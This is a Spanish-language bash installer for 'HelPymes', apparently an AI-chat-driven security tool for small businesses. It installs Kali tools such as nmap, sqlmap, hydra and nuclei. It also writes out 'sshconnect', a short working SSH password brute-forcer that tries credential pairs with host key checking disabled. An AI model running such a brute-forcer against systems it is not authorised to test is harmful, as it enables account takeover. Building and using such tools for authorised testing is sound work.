#!/bin/bash

# ═══════════════════════════════════════════════════════════
#  HelPymes - Script de Instalación Universal
#  Herramienta de Ciberseguridad para PYMEs
# ═══════════════════════════════════════════════════════════

set -e  # Salir si hay error

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Funciones de utilidad
print_header() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
}

print_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

print_error() {
    echo -e "${RED}❌ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

print_info() {
    echo -e "${BLUE}ℹ️  $1${NC}"
}

# Verificar si se ejecuta como root
if [[ $EUID -eq 0 ]]; then
   print_error "No ejecutes este script como root. Usa tu usuario normal."
   exit 1
fi

clear
echo -e "${MAGENTA}"
cat << "EOF"
    ╦ ╦┌─┐┬  ╔═╗┬ ┬┌┬┐┌─┐┌─┐
    ╠═╣├┤ │  ╠═╝└┬┘│││├┤ └─┐
    ╩ ╩└─┘┴─┘╩   ┴ ┴ ┴└─┘└─┘

    Herramienta de Ciberseguridad para PYMEs
    Instalador Automático v2.0
EOF
echo -e "${NC}"

print_header "Iniciando Instalación"

# Detectar sistema operativo
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    VER=$VERSION_ID
else
    print_error "No se puede detectar el sistema operativo"
    exit 1
fi

print_info "Sistema detectado: $OS $VER"

# ═══════════════════════════════════════════════════════════
# 1. ACTUALIZAR REPOSITORIOS
# ═══════════════════════════════════════════════════════════

print_header "Actualizando repositorios del sistema"

if [[ "$OS" == "kali" ]] || [[ "$OS" == "debian" ]] || [[ "$OS" == "ubuntu" ]]; then
    sudo apt update -qq
    print_success "Repositorios actualizados"
elif [[ "$OS" == "fedora" ]] || [[ "$OS" == "rhel" ]] || [[ "$OS" == "rocky" ]]; then
    sudo dnf update -y -q
    print_success "Repositorios actualizados"
elif [[ "$OS" == "arch" ]] || [[ "$OS" == "manjaro" ]]; then
    sudo pacman -Syu --noconfirm
    print_success "Repositorios actualizados"
else
    print_warning "Sistema operativo no reconocido completamente, intentando continuar..."
fi

# ═══════════════════════════════════════════════════════════
# 2. INSTALAR PYTHON Y PIP
# ═══════════════════════════════════════════════════════════

print_header "Instalando Python 3 y pip"

if [[ "$OS" == "kali" ]] || [[ "$OS" == "debian" ]] || [[ "$OS" == "ubuntu" ]]; then
    sudo apt install -y python3 python3-pip python3-venv git curl wget >/dev/null 2>&1
    print_success "Python 3 y pip instalados"
elif [[ "$OS" == "fedora" ]] || [[ "$OS" == "rhel" ]] || [[ "$OS" == "rocky" ]]; then
    sudo dnf install -y python3 python3-pip python3-devel git curl wget >/dev/null 2>&1
    print_success "Python 3 y pip instalados"
elif [[ "$OS" == "arch" ]] || [[ "$OS" == "manjaro" ]]; then
    sudo pacman -S --noconfirm python python-pip git curl wget >/dev/null 2>&1
    print_success "Python 3 y pip instalados"
fi

# Verificar versión de Python
PYTHON_VERSION=$(python3 --version | cut -d' ' -f2)
print_info "Python versión: $PYTHON_VERSION"

# ═══════════════════════════════════════════════════════════
# 3. INSTALAR HERRAMIENTAS DE KALI (si no están)
# ═══════════════════════════════════════════════════════════

print_header "Instalando herramientas de seguridad"

TOOLS_TO_INSTALL=""

# Verificar qué herramientas faltan
command -v nmap >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL nmap"
command -v gobuster >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL gobuster"
command -v nikto >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL nikto"
command -v sqlmap >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL sqlmap"
command -v hydra >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL hydra"
command -v john >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL john"
command -v dirb >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL dirb"
command -v sshpass >/dev/null 2>&1 || TOOLS_TO_INSTALL="$TOOLS_TO_INSTALL sshpass"

if [[ ! -z "$TOOLS_TO_INSTALL" ]]; then
    print_info "Instalando herramientas faltantes..."

    if [[ "$OS" == "kali" ]] || [[ "$OS" == "debian" ]] || [[ "$OS" == "ubuntu" ]]; then
        sudo apt install -y $TOOLS_TO_INSTALL >/dev/null 2>&1
    elif [[ "$OS" == "fedora" ]] || [[ "$OS" == "rhel" ]] || [[ "$OS" == "rocky" ]]; then
        sudo dnf install -y $TOOLS_TO_INSTALL >/dev/null 2>&1
    elif [[ "$OS" == "arch" ]] || [[ "$OS" == "manjaro" ]]; then
        sudo pacman -S --noconfirm $TOOLS_TO_INSTALL >/dev/null 2>&1
    fi

    print_success "Herramientas básicas instaladas"
else
    print_success "Todas las herramientas básicas ya están instaladas"
fi

# Herramientas opcionales
print_info "Verificando herramientas opcionales..."
command -v wpscan >/dev/null 2>&1 && print_success "wpscan: instalado" || print_warning "wpscan: no instalado (opcional)"
command -v enum4linux >/dev/null 2>&1 && print_success "enum4linux: instalado" || print_warning "enum4linux: no instalado (opcional)"

# ═══════════════════════════════════════════════════════════
# 4. INSTALAR NUCLEI
# ═══════════════════════════════════════════════════════════

if ! command -v nuclei &> /dev/null; then
    print_header "Instalando Nuclei"

    # Instalar Go si no está instalado
    if ! command -v go &> /dev/null; then
        print_info "Instalando Go (requerido para Nuclei)..."

        GO_VERSION="1.21.5"
        wget -q https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz -O /tmp/go.tar.gz
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz

        export PATH=$PATH:/usr/local/go/bin
        export GOPATH=$HOME/go

        # Añadir a bashrc/zshrc
        if [ -f ~/.zshrc ]; then
            echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.zshrc
            echo 'export GOPATH=$HOME/go' >> ~/.zshrc
            echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.zshrc
        fi
        if [ -f ~/.bashrc ]; then
            echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
            echo 'export GOPATH=$HOME/go' >> ~/.bashrc
            echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc
        fi

        rm /tmp/go.tar.gz
        print_success "Go instalado"
    fi

    # Instalar nuclei
    print_info "Instalando Nuclei..."
    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest >/dev/null 2>&1

    # Copiar a /usr/local/bin
    if [ -f ~/go/bin/nuclei ]; then
        sudo cp ~/go/bin/nuclei /usr/local/bin/
        print_success "Nuclei instalado"

        # Actualizar templates
        print_info "Actualizando templates de Nuclei..."
        nuclei -update-templates >/dev/null 2>&1
        print_success "Templates actualizados"
    else
        print_warning "Nuclei: instalación manual requerida"
    fi
else
    print_success "Nuclei ya está instalado"
    nuclei -update-templates >/dev/null 2>&1 && print_info "Templates actualizados" || true
fi

# ═══════════════════════════════════════════════════════════
# 5. INSTALAR GITLEAKS
# ═══════════════════════════════════════════════════════════

if ! command -v gitleaks &> /dev/null; then
    print_header "Instalando Gitleaks"

    GITLEAKS_VERSION="8.18.1"
    print_info "Descargando Gitleaks v${GITLEAKS_VERSION}..."

    wget -q https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz -O /tmp/gitleaks.tar.gz
    tar -xzf /tmp/gitleaks.tar.gz -C /tmp/
    sudo mv /tmp/gitleaks /usr/local/bin/
    sudo chmod +x /usr/local/bin/gitleaks
    rm /tmp/gitleaks.tar.gz

    print_success "Gitleaks instalado"
else
    print_success "Gitleaks ya está instalado"
fi

# ═══════════════════════════════════════════════════════════
# 6. INSTALAR WHATWEB
# ═══════════════════════════════════════════════════════════

if ! command -v whatweb &> /dev/null; then
    print_header "Instalando WhatWeb"

    if [[ "$OS" == "kali" ]] || [[ "$OS" == "debian" ]] || [[ "$OS" == "ubuntu" ]]; then
        sudo apt install -y whatweb >/dev/null 2>&1
        print_success "WhatWeb instalado"
    else
        print_info "Instalando WhatWeb desde GitHub..."
        git clone https://github.com/urbanadventurer/WhatWeb.git /tmp/whatweb >/dev/null 2>&1
        cd /tmp/whatweb
        sudo make install >/dev/null 2>&1
        cd - >/dev/null
        rm -rf /tmp/whatweb
        print_success "WhatWeb instalado"
    fi
else
    print_success "WhatWeb ya está instalado"
fi

# ═══════════════════════════════════════════════════════════
# 7. INSTALAR DEPENDENCIAS PYTHON
# ═══════════════════════════════════════════════════════════

print_header "Instalando dependencias Python"

# Función para instalar paquete Python
install_python_package() {
    local package=$1
    local package_name=$(echo "$package" | cut -d'>' -f1 | cut -d'<' -f1 | cut -d'=' -f1 | xargs)

    # Verificar si ya está instalado
    if python3 -c "import $package_name" 2>/dev/null; then
        return 0
    fi

    # Intentar instalación con --break-system-packages
    if pip3 install "$package" --break-system-packages >/dev/null 2>&1; then
        return 0
    fi

    # Si falla, intentar sin flag
    if pip3 install "$package" >/dev/null 2>&1; then
        return 0
    fi

    return 1
}

# Instalar desde requirements.txt si existe
if [ -f "requirements.txt" ]; then
    print_info "Instalando desde requirements.txt..."

    # Intentar instalación con --break-system-packages
    if pip3 install -r requirements.txt --break-system-packages >/dev/null 2>&1; then
        print_success "Dependencias Python instaladas"
    else
        # Si falla, instalar uno por uno
        print_info "Instalando paquetes individualmente..."

        while IFS= read -r line || [ -n "$line" ]; do
            # Ignorar comentarios y líneas vacías
            [[ "$line" =~ ^#.*$ ]] && continue
            [[ -z "$line" ]] && continue

            package_name=$(echo "$line" | cut -d'>' -f1 | cut -d'<' -f1 | cut -d'=' -f1 | xargs)

            if install_python_package "$line"; then
                print_success "$package_name instalado"
            else
                print_warning "$package_name: error en instalación"
            fi
        done < requirements.txt
    fi
else
    print_warning "requirements.txt no encontrado, instalando dependencias manualmente..."

    PYTHON_PACKAGES=(
        "anthropic"
        "groq"
        "flask"
        "requests"
        "semgrep"
        "bandit"
    )

    for package in "${PYTHON_PACKAGES[@]}"; do
        if install_python_package "$package"; then
            print_success "$package instalado"
        else
            print_warning "$package: error en instalación"
        fi
    done
fi

# Instalar pip-audit (opcional)
print_info "Instalando pip-audit..."
if install_python_package "pip-audit"; then
    print_success "pip-audit instalado"
else
    print_warning "pip-audit: no instalado (opcional)"
fi

# Verificar instalación de paquetes críticos
print_info "Verificando paquetes Python..."

VERIFICATION_PASSED=true

python3 << 'PYCHECK' || VERIFICATION_PASSED=false
import sys
packages = {
    'anthropic': 'Anthropic API',
    'groq': 'Groq API',
    'flask': 'Flask',
    'requests': 'Requests',
}

all_ok = True
for pkg, desc in packages.items():
    try:
        __import__(pkg)
    except ImportError:
        print(f"⚠️  {desc} no instalado")
        all_ok = False

if not all_ok:
    sys.exit(1)
PYCHECK

if [ "$VERIFICATION_PASSED" = true ]; then
    print_success "Paquetes Python verificados"
else
    print_warning "Algunos paquetes Python pueden faltar, pero se puede continuar"
fi

# ═══════════════════════════════════════════════════════════
# 8. INSTALAR SCRIPTS PERSONALIZADOS
# ═══════════════════════════════════════════════════════════

print_header "Instalando scripts personalizados"

# Crear directorio bin si no existe
mkdir -p ~/bin

# Verificar si existe bin/ en el repositorio
if [ -d "bin" ] && [ -f "bin/sshconnect" ]; then
    print_info "Instalando desde bin/ del repositorio..."

    # Copiar sshconnect
    cp bin/sshconnect ~/bin/sshconnect
    chmod +x ~/bin/sshconnect
    sudo ln -sf ~/bin/sshconnect /usr/local/bin/sshconnect
    print_success "sshconnect instalado desde repositorio"
else
    # Crear sshconnect si no existe
    print_info "Creando script sshconnect..."

    cat > ~/bin/sshconnect << 'SSHCONNECT_EOF'
#!/bin/bash

TARGET=$1
CREDENTIALS_FILE=$2
PORT=${3:-22}

# Validación
if [ -z "$TARGET" ] || [ -z "$CREDENTIALS_FILE" ]; then
    echo "Error: Uso: $0 <target> <credentials_file> [port]" >&2
    exit 1
fi

if [ ! -f "$CREDENTIALS_FILE" ]; then
    echo "Error: Archivo '$CREDENTIALS_FILE' no encontrado" >&2
    exit 1
fi

echo "🔐 Iniciando SSH bruteforce"
echo "🎯 Target: $TARGET:$PORT"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"

SUCCESS=false

while IFS=':' read -r USER PASSWORD; do
    [[ -z "$USER" || "$USER" =~ ^# ]] && continue

    USER=$(echo "$USER" | xargs)
    PASSWORD=$(echo "$PASSWORD" | xargs)

    echo "🔑 Probando: $USER"

    if sshpass -p "$PASSWORD" ssh -p "$PORT" -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$TARGET" "exit" 2>/dev/null; then
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "✅ CREDENCIALES VÁLIDAS:"
        echo "   Usuario: $USER"
        echo "   Password: $PASSWORD"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
        SUCCESS=true
        break
    fi
done < "$CREDENTIALS_FILE"

if [ "$SUCCESS" = false ]; then
    echo "❌ No se encontraron credenciales válidas"
    exit 1
fi

exit 0
SSHCONNECT_EOF

    chmod +x ~/bin/sshconnect
    sudo ln -sf ~/bin/sshconnect /usr/local/bin/sshconnect
    print_success "sshconnect creado e instalado"
fi

# ═══════════════════════════════════════════════════════════
# 9. DAR PERMISOS DE EJECUCIÓN
# ═══════════════════════════════════════════════════════════

print_header "Configurando permisos de ejecución"

chmod +x chat_kali_api.py 2>/dev/null && print_success "chat_kali_api.py ejecutable" || print_warning "chat_kali_api.py no encontrado"
chmod +x chat_claude.py 2>/dev/null && print_success "chat_claude.py ejecutable" || print_warning "chat_claude.py no encontrado"
chmod +x kali_server.py 2>/dev/null && print_success "kali_server.py ejecutable" || print_warning "kali_server.py no encontrado"

# ═══════════════════════════════════════════════════════════
# 10. VERIFICAR INSTALACIÓN
# ═══════════════════════════════════════════════════════════

print_header "Verificación Final"

# Verificar herramientas críticas
CRITICAL_TOOLS=(
    "nmap"
    "gobuster"
    "nikto"
    "sqlmap"
    "hydra"
    "sshpass"
    "sshconnect"
)

MISSING_CRITICAL=()

echo ""
print_info "Herramientas críticas:"
for tool in "${CRITICAL_TOOLS[@]}"; do
    if command -v $tool &> /dev/null; then
        print_success "$tool"
    else
        print_error "$tool NO encontrado"
        MISSING_CRITICAL+=("$tool")
    fi
done

# Verificar herramientas SAST
echo ""
print_info "Herramientas SAST:"
command -v gitleaks &> /dev/null && print_success "gitleaks" || print_warning "gitleaks"
command -v nuclei &> /dev/null && print_success "nuclei" || print_warning "nuclei"
python3 -c "import semgrep" 2>/dev/null && print_success "semgrep" || print_warning "semgrep"
python3 -c "import bandit" 2>/dev/null && print_success "bandit" || print_warning "bandit"

# ═══════════════════════════════════════════════════════════
# 11. CONFIGURACIÓN DE API KEYS
# ═══════════════════════════════════════════════════════════

print_header "Configuración de API Keys"

# Detectar shell del usuario
USER_SHELL=$(basename "$SHELL")
if [[ "$USER_SHELL" == "zsh" ]]; then
    SHELL_RC="~/.zshrc"
elif [[ "$USER_SHELL" == "bash" ]]; then
    SHELL_RC="~/.bashrc"
else
    SHELL_RC="~/.profile"
fi

echo ""
print_warning "IMPORTANTE: Configura tus API keys para usar la herramienta"
echo ""
print_info "Edita tu archivo de configuración del shell:"
echo -e "  ${CYAN}nano $SHELL_RC${NC}"
echo ""
echo "Añade al final del archivo:"
echo -e "  ${GREEN}export GROQ_API_KEY=\"tu_api_key_de_groq\"${NC}"
echo -e "  ${GREEN}export ANTHROPIC_API_KEY=\"tu_api_key_de_anthropic\"${NC}"
echo ""
print_info "Obtén tus API keys (gratuitas) en:"
echo "  • Groq: https://console.groq.com/keys"
echo "  • Anthropic: https://console.anthropic.com/settings/keys"
echo ""
print_info "Después de configurar, recarga el shell:"
echo -e "  ${CYAN}source $SHELL_RC${NC}"
echo ""

# ═══════════════════════════════════════════════════════════
# 12. RESUMEN FINAL
# ═══════════════════════════════════════════════════════════

print_header "Resumen de Instalación"

if [ ${#MISSING_CRITICAL[@]} -eq 0 ]; then
    echo ""
    print_success "✨ Instalación completada exitosamente!"
    echo ""
    print_info "Próximos pasos:"
    echo "  1. Configura tus API keys (ver instrucciones arriba)"
    echo "  2. Recarga tu shell: ${CYAN}source $SHELL_RC${NC}"
    echo "  3. Inicia el servidor: ${CYAN}./kali_server.py${NC}"
    echo "  4. Inicia el chat:"
    echo "     - Con Groq: ${CYAN}./chat_kali_api.py${NC}"
    echo "     - Con Claude: ${CYAN}./chat_claude.py${NC}"
    echo ""
    print_success "¡Todo listo para usar HelPymes! 🚀"
else
    echo ""
    print_warning "Instalación completada con advertencias"
    echo ""
    print_error "Herramientas críticas faltantes:"
    for tool in "${MISSING_CRITICAL[@]}"; do
        echo "  • $tool"
    done
    echo ""
    print_info "Instala las herramientas faltantes manualmente o ejecuta de nuevo el instalador"
fi

echo ""
print_info "Documentación: ${CYAN}https://github.com/asiermv2/HelPymes${NC}"
print_info "Soporte: ${CYAN}asiermv2@gmail.com${NC}"
echo ""

# Mostrar siguiente comando recomendado
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}  Siguiente paso recomendado:${NC}"
echo -e "${CYAN}  nano $SHELL_RC${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""
